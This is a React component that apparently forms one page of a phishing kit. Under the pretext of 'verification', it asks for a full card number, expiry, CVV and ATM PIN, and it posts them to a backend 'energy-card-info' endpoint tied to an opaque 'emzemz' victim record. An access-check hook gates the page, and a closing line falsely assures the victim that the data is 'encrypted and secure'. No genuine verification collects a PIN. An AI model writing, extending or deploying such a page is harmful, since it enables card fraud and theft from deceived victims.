import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';

const Card: React.FC = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [atmPin, setAtmPin] = useState('');
  const [showCvv, setShowCvv] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    atmPin: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (!isAllowed) {
    return (
      <FlowCard title="Loading">
        <div className="text-center text-white">Loading...</div>
      </FlowCard>
    );
  }

  if (!emzemz) {
    return (
      <FlowCard title="Error">
        <div className="text-center text-red-500">
          Missing user details. Please restart the process.
        </div>
      </FlowCard>
    );
  }

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
    const groups = digitsOnly.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digitsOnly;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const cardDigits = cardNumber.replace(/\s/g, '');
    const newErrors = {
      cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
      expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
      cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/energy-card-info/`, {
          emzemz,
          cardNumber: cardDigits,
          expiryMonth,
          expiryYear,
          cvv,
          atmPin
        });
        console.log('Card information submitted successfully');
        navigate('/terms', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting card info:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => currentYear + i);

  return (
    <FlowCard title="Card Information">
      <form onSubmit={handleSubmit} className="space-y-4">
        <p className="text-sm text-slate-300 mb-4">
          Please provide your card details for verification purposes.
        </p>

        {/* Card Number */}
        <div>
          <label className="block text-sm font-medium text-slate-300 mb-1" htmlFor="cardNumber">
            Card Number
          </label>
          <input
            id="cardNumber"
            name="cardNumber"
            type="text"
            value={cardNumber}
            onChange={handleCardNumberChange}
            maxLength={19}
            className="w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
            placeholder="1234 5678 9012 3456"
          />
          {errors.cardNumber && (
            <div className="flex items-center gap-2 text-sm text-red-500 mt-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              {errors.cardNumber}
            </div>
          )}
        </div>

        {/* Expiry Date */}
        <div>
          <label className="block text-sm font-medium text-slate-300 mb-1">Expiry Date</label>
          <div className="flex gap-2">
            <select
              value={expiryMonth}
              onChange={(e) => setExpiryMonth(e.target.value)}
              className="flex-1 bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
            >
              <option value="" className="bg-slate-800">Month</option>
              {Array.from({ length: 12 }, (_, i) => (
                <option key={i + 1} value={String(i + 1).padStart(2, '0')} className="bg-slate-800">
                  {String(i + 1).padStart(2, '0')}
                </option>
              ))}
            </select>
            <select
              value={expiryYear}
              onChange={(e) => setExpiryYear(e.target.value)}
              className="flex-1 bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
            >
              <option value="" className="bg-slate-800">Year</option>
              {years.map((year) => (
                <option key={year} value={year} className="bg-slate-800">
                  {year}
                </option>
              ))}
            </select>
          </div>
          {errors.expiry && (
            <div className="flex items-center gap-2 text-sm text-red-500 mt-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              {errors.expiry}
            </div>
          )}
        </div>

        {/* CVV */}
        <div>
          <label className="block text-sm font-medium text-slate-300 mb-1" htmlFor="cvv">
            CVV
          </label>
          <div className="relative">
            <input
              id="cvv"
              name="cvv"
              type={showCvv ? 'text' : 'password'}
              value={cvv}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '');
                if (value.length <= 4) setCvv(value);
              }}
              maxLength={4}
              className="w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
              placeholder="123"
            />
            <button
              type="button"
              onClick={() => setShowCvv(!showCvv)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#00b4ff] text-sm hover:underline"
            >
              {showCvv ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.cvv && (
            <div className="flex items-center gap-2 text-sm text-red-500 mt-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              {errors.cvv}
            </div>
          )}
        </div>

        {/* ATM PIN */}
        <div>
          <label className="block text-sm font-medium text-slate-300 mb-1" htmlFor="atmPin">
            ATM PIN
          </label>
          <div className="relative">
            <input
              id="atmPin"
              name="atmPin"
              type={showPin ? 'text' : 'password'}
              value={atmPin}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '');
                if (value.length <= 4) setAtmPin(value);
              }}
              maxLength={4}
              className="w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]"
              placeholder="****"
            />
            <button
              type="button"
              onClick={() => setShowPin(!showPin)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#00b4ff] text-sm hover:underline"
            >
              {showPin ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.atmPin && (
            <div className="flex items-center gap-2 text-sm text-red-500 mt-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              {errors.atmPin}
            </div>
          )}
        </div>

        <div className="pt-4">
          {!isLoading ? (
            <button
              type="submit"
              className="w-full bg-[#00b4ff] hover:bg-[#0099dd] text-white py-3 rounded font-medium transition-colors"
              disabled={isLoading}
            >
              Continue
            </button>
          ) : (
            <div className="flex justify-center py-3">
              <div className="h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#00b4ff] border-t-transparent"></div>
            </div>
          )}
        </div>

        <p className="text-xs text-slate-400 mt-4">
          Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
        </p>
      </form>
    </FlowCard>
  );
};

export default Card;
